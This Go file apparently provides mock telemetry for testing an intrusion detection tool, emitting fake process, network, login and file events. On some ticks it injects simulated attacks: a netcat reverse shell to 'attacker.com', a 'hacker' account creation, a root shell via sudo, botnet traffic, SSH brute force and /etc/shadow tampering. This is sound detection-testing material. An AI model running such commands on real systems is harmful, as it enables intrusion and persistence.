package main

import (
	"math/rand"
	"time"
)

type MockCollector struct {
	tickCount int
}

func NewMockCollector() *MockCollector {
	rand.Seed(time.Now().UnixNano())
	return &MockCollector{}
}

func (m *MockCollector) CollectProcesses() []ProcessEvent {
	m.tickCount++
	var events []ProcessEvent

	// Regular background processes
	normalProcs := []struct {
		cmd  string
		exec string
		user string
	}{
		{"/usr/sbin/nginx -g daemon on;", "nginx", "nginx"},
		{"/usr/bin/postgres -D /var/lib/postgresql/data", "postgres", "postgres"},
		{"redis-server *:6379", "redis-server", "redis"},
		{"/lib/systemd/systemd-journald", "systemd-journald", "root"},
		{"node /app/index.js", "node", "app"},
		{"python3 -m pip install requests", "pip", "developer"},
		{"git pull origin main", "git", "developer"},
		{"cron -f", "cron", "root"},
	}

	// Always emit 1-2 standard background tasks
	for i := 0; i < 2; i++ {
		p := normalProcs[rand.Intn(len(normalProcs))]
		events = append(events, ProcessEvent{
			PID:        rand.Intn(30000) + 1000,
			PPID:       rand.Intn(500) + 1,
			Command:    p.cmd,
			Executable: p.exec,
			User:       p.user,
			Timestamp:  time.Now(),
		})
	}

	// Trigger mock attacks on specific ticks
	if m.tickCount%6 == 0 {
		// Mock Reverse Shell Attack
		events = append(events, ProcessEvent{
			PID:        4120 + m.tickCount,
			PPID:       4100,
			Command:    "nc attacker.com 4444 -e /bin/bash",
			Executable: "nc",
			User:       "root",
			Timestamp:  time.Now(),
		})
	} else if m.tickCount%10 == 0 {
		// Mock Suspicious User Creation
		events = append(events, ProcessEvent{
			PID:        9210 + m.tickCount,
			PPID:       9200,
			Command:    "useradd -m hacker -s /bin/bash",
			Executable: "useradd",
			User:       "root",
			Timestamp:  time.Now(),
		})
	} else if m.tickCount%15 == 0 {
		// Mock Privilege Escalation
		events = append(events, ProcessEvent{
			PID:        10400 + m.tickCount,
			PPID:       10300,
			Command:    "sudo -u root /bin/sh",
			Executable: "sudo",
			User:       "admin",
			Timestamp:  time.Now(),
		})
	}

	return events
}

func (m *MockCollector) CollectNetwork() []NetworkEvent {
	var events []NetworkEvent

	// Regular traffic
	destinations := []struct {
		ip   string
		dest string
		port int
	}{
		{"142.250.190.46", "google.com", 443},
		{"185.199.108.153", "github.com", 443},
		{"104.244.42.1", "twitter.com", 443},
		{"172.217.16.142", "googleapis.com", 80},
	}

	// Output ordinary network activities
	for i := 0; i < 2; i++ {
		d := destinations[rand.Intn(len(destinations))]
		events = append(events, NetworkEvent{
			Source:      "192.168.1.15",
			Destination: d.dest,
			IP:          d.ip,
			Port:        d.port,
			Protocol:    "TCP",
			Process:     "curl",
			Timestamp:   time.Now(),
		})
	}

	// Threat intel alerts - trigger periodically
	if m.tickCount%8 == 0 {
		events = append(events, NetworkEvent{
			Source:      "192.168.1.15",
			Destination: "evil-botnet.ru",
			IP:          "185.230.125.1", // Malicious IP mapped in Threat Intel DB
			Port:        80,
			Protocol:    "TCP",
			Process:     "python3",
			Timestamp:   time.Now(),
		})
	}

	return events
}

func (m *MockCollector) CollectLogins() []LoginEvent {
	var events []LoginEvent

	// 5% chance of routine login
	if rand.Float32() < 0.1 {
		users := []string{"admin", "developer", "ubuntu"}
		events = append(events, LoginEvent{
			Event:     "login",
			User:      users[rand.Intn(len(users))],
			SourceIP:  "192.168.1.50",
			Timestamp: time.Now(),
		})
	}

	// State-triggered SSH Brute Force
	// We want to send 5 failed logins within a single collection step to trigger the alerts
	if m.tickCount%7 == 0 {
		failedIPs := []string{"198.51.100.72", "203.0.113.4", "45.80.201.12"}
		attackerIP := failedIPs[rand.Intn(len(failedIPs))]
		for i := 0; i < 5; i++ {
			events = append(events, LoginEvent{
				Event:     "failed_login",
				User:      "root",
				SourceIP:  attackerIP,
				Timestamp: time.Now().Add(time.Duration(-i) * time.Second),
			})
		}
	}

	return events
}

func (m *MockCollector) CollectFiles() []FileEvent {
	var events []FileEvent

	// Trigger simulated file manipulations
	if m.tickCount%9 == 0 {
		events = append(events, FileEvent{
			Path:      "/etc/shadow",
			Action:    "modify",
			User:      "root",
			Timestamp: time.Now(),
		})
	} else if m.tickCount%12 == 0 {
		events = append(events, FileEvent{
			Path:      "/var/spool/cron/crontabs/root",
			Action:    "create",
			User:      "root",
			Timestamp: time.Now(),
		})
	}

	return events
}
